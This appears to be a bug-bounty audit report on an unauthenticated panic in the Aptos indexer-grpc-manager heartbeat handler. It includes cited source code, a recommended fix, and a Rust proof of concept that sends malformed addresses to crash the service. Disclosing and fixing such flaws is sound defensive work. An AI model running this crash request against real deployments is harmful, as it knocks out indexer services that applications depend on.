# Audit Report

## Title
Unauthenticated Panic Attack via Malformed Address in Indexer gRPC Manager Heartbeat Handler

## Summary
The indexer-grpc-manager service accepts unauthenticated heartbeat requests containing attacker-controlled address fields. When a malformed address is provided, the dynamic service registration logic triggers a panic via `.expect("Bad address.")` on `Channel::from_shared()` failure, causing complete service crash. This vulnerability affects the indexer infrastructure's availability but does **not** impact core blockchain consensus, state, or validator operations.

## Finding Description

The vulnerability exists in the heartbeat handling flow of the indexer-grpc-manager service. The attack path is as follows:

1. **Entry Point**: The `GrpcManager` service exposes an unauthenticated `Heartbeat` RPC endpoint [1](#0-0) 

2. **Address Extraction**: The heartbeat handler extracts the client-supplied address from the request without validation [2](#0-1) 

3. **Dynamic Service Registration**: When handling heartbeats from new services, the `MetadataManager` uses `.or_insert()` to dynamically register new data services [3](#0-2) 

4. **Panic Trigger**: The constructor creates a gRPC channel using the unvalidated address, with `.expect("Bad address.")` causing a panic on malformed URIs [4](#0-3) 

The same vulnerability pattern exists in multiple service constructors (Peer, Fullnode, LiveDataService, HistoricalDataService) [5](#0-4) 

**Attack Scenario:**
An attacker crafts a `HeartbeatRequest` with a malformed address (e.g., "invalid-uri-no-scheme" or "http://[::1" with unclosed bracket) in the `ServiceInfo.address` field. When the manager attempts to create a gRPC client for this address, `Channel::from_shared()` returns an error for the invalid URI, and `.expect()` panics, crashing the entire service.

## Impact Explanation

**Severity: High** according to Aptos bug bounty criteria ("API crashes").

However, **critical context**: The indexer-grpc-manager is an **ecosystem service** located in `ecosystem/indexer-grpc/`, **NOT** a core blockchain component. It provides indexed data access for applications but is **NOT** part of:
- Validator nodes or consensus ( [6](#0-5) )
- Blockchain execution or state management
- On-chain governance or staking systems

**Impact is limited to:**
- Denial of service for the indexer-grpc-manager instance
- Disruption of indexed data queries for applications using this service
- No effect on blockchain consensus, safety, or liveness
- No effect on validator operations or block production
- No fund loss or state corruption

This vulnerability does **not** break any of the 10 critical blockchain invariants (deterministic execution, consensus safety, Move VM safety, state consistency, governance integrity, staking security, transaction validation, access control, resource limits, cryptographic correctness).

## Likelihood Explanation

**Likelihood: High** if the service is network-accessible.

The attack requires:
- Network access to the gRPC endpoint (depends on deployment configuration)
- Ability to send gRPC requests (trivial with standard tools)
- No authentication or special privileges required
- Attack complexity is minimal (single malformed request)

The service configuration shows no authentication or TLS requirement [7](#0-6) 

## Recommendation

Implement proper error handling instead of using `.expect()`:

```rust
fn new(address: GrpcAddress) -> Result<Self, anyhow::Error> {
    let channel = Channel::from_shared(address.clone())
        .context(format!("Invalid address: {}", address))?
        .connect_lazy();
    let client = DataServiceClient::new(channel)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
    Ok(Self {
        client,
        recent_states: VecDeque::new(),
    })
}
```

Update callers to handle errors gracefully:
```rust
fn handle_live_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: LiveDataServiceInfo,
) -> Result<()> {
    // Validate address before attempting to create service
    let _ = Channel::from_shared(address.clone())
        .context(format!("Invalid service address in heartbeat: {}", address))?;
    
    let mut entry = self
        .live_data_services
        .entry(address.clone())
        .or_insert_with(|| LiveDataService::new(address).expect("Validated above"));
    // ... rest of function
}
```

Additionally, consider:
- Implementing authentication for the heartbeat endpoint
- Rate limiting heartbeat requests
- Validating address format before processing

## Proof of Concept

```rust
// PoC: Crash indexer-grpc-manager via malformed heartbeat address
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo,
    service_info::Info, LiveDataServiceInfo,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer-grpc-manager
    let mut client = GrpcManagerClient::connect("http://localhost:50051").await?;
    
    // Craft malformed address (missing scheme, invalid characters, etc.)
    let malformed_addresses = vec![
        "invalid-uri-no-scheme",
        "http://[::1",  // Unclosed IPv6 bracket
        "://missing-scheme",
        "http://",  // Empty host
    ];
    
    for addr in malformed_addresses {
        println!("Attempting attack with address: {}", addr);
        
        let request = Request::new(HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(addr.to_string()),
                info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: None,
                    known_latest_version: Some(0),
                    stream_info: None,
                    min_servable_version: None,
                })),
            }),
        });
        
        // This will cause the server to panic when it tries to create
        // a channel with Channel::from_shared(addr).expect("Bad address.")
        match client.heartbeat(request).await {
            Ok(_) => println!("Request succeeded (unexpected)"),
            Err(e) => println!("Request failed: {} (server may have crashed)", e),
        }
    }
    
    Ok(())
}
```

**Expected Result**: The indexer-grpc-manager process terminates with a panic message "Bad address." after the first malformed heartbeat request.

---

## Notes

While this is a valid panic vulnerability with **High severity** under bug bounty criteria for "API crashes," it's crucial to note this affects an **ecosystem indexer service**, not core blockchain infrastructure. The vulnerability does not impact:

- Blockchain consensus or validator operations
- Transaction execution or state integrity  
- On-chain governance or staking mechanisms
- Fund security or Move VM safety

The indexer-grpc services are optional data infrastructure for applications, similar to block explorers. Their unavailability does not compromise blockchain security or operation.

### Citations

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L103-105)
```text
service GrpcManager {
  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
  rpc GetTransactions(GetTransactionsRequest) returns (TransactionsResponse);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L44-80)
```rust
impl Peer {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = GrpcManagerClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
}

struct Fullnode {
    client: FullnodeDataClient<Channel>,
    recent_states: VecDeque<FullnodeInfo>,
}

impl Fullnode {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = FullnodeDataClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L88-102)
```rust
impl LiveDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
        let client = DataServiceClient::new(channel)
            .send_compressed(CompressionEncoding::Zstd)
            .accept_compressed(CompressionEncoding::Zstd)
            .max_encoding_message_size(MAX_MESSAGE_SIZE)
            .max_decoding_message_size(MAX_MESSAGE_SIZE);
        Self {
            client,
            recent_states: VecDeque::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L22-28)
```rust
pub(crate) struct GrpcManager {
    chain_id: u64,
    file_store_uploader: Mutex<FileStoreUploader>,
    metadata_manager: Arc<MetadataManager>,
    data_manager: Arc<DataManager>,
    is_master: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-105)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

```
